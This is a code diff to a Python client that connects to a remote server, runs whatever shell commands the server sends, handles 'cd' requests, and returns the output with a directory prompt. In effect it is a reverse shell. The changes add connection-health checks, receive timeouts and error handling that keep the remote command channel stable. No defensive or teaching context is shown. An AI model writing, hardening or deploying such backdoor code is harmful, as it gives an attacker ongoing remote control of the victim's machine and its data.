@@ -67,16 +67,42 @@ def connect_to_server(host, port):
         log_message(f"Unexpected error during connection: {str(e)}", "ERROR")
         return None
 
+# Check if connection is still alive
+def is_connection_alive(s):
+    try:
+        # Use MSG_PEEK to check without removing data from queue
+        data = s.recv(1, socket.MSG_PEEK)
+        return True
+    except socket.error:
+        return False
+    except Exception:
+        return False
+
 # Execute commands received from server
 def execute_commands(s):
     try:
         while True:
             try:
+                # Check connection health before receiving
+                if not is_connection_alive(s):
+                    log_message("Connection health check failed", "WARNING")
+                    break
+                
+                # Set timeout for receive operation
+                s.settimeout(1.0)
+                
                 # Receive data from server
-                data = s.recv(1024)
+                try:
+                    data = s.recv(1024)
+                except socket.timeout:
+                    # Timeout is ok, just continue checking
+                    continue
+                
+                # Reset timeout
+                s.settimeout(None)
                 
                 if not data:
-                    log_message("No data received, connection may be closed", "WARNING")
+                    log_message("Server closed connection", "WARNING")
                     break
                 
                 # Handle directory change command
@@ -87,7 +113,11 @@ def execute_commands(s):
                     except Exception as e:
                         log_message(f"Failed to change directory: {str(e)}", "ERROR")
                         error_msg = f"Error: {str(e)}\n"
-                        s.send(str.encode(error_msg + os.getcwd() + "> "))
+                        try:
+                            s.send(str.encode(error_msg + os.getcwd() + "> "))
+                        except socket.error:
+                            log_message("Failed to send response - connection lost", "ERROR")
+                            break
                         continue
                 
                 # Execute command
@@ -108,21 +138,25 @@ def execute_commands(s):
                         output_str = str(output_byte, "utf-8")
                         currentWD = os.getcwd() + "> "
                         
-                        # Send response back to server
-                        s.send(str.encode(output_str + currentWD))
-                        log_message(f"Command executed successfully")
+                        # Send response back to server with connection check
+                        try:
+                            s.send(str.encode(output_str + currentWD))
+                            log_message(f"Command executed successfully")
+                        except socket.error as e:
+                            log_message(f"Failed to send response: {str(e)}", "ERROR")
+                            break
                         
                     except Exception as e:
                         log_message(f"Error executing command: {str(e)}", "ERROR")
                         error_msg = f"Error executing command: {str(e)}\n"
                         try:
                             s.send(str.encode(error_msg + os.getcwd() + "> "))
-                        except:
-                            log_message("Failed to send error message to server", "ERROR")
+                        except socket.error:
+                            log_message("Failed to send error message - connection lost", "ERROR")
                             break
                             
             except socket.error as e:
-                log_message(f"Socket error in command loop: {str(e)}", "ERROR")
+                log_message(f"Socket error: {str(e)}", "ERROR")
                 break
             except Exception as e:
                 log_message(f"Unexpected error in command loop: {str(e)}", "ERROR")
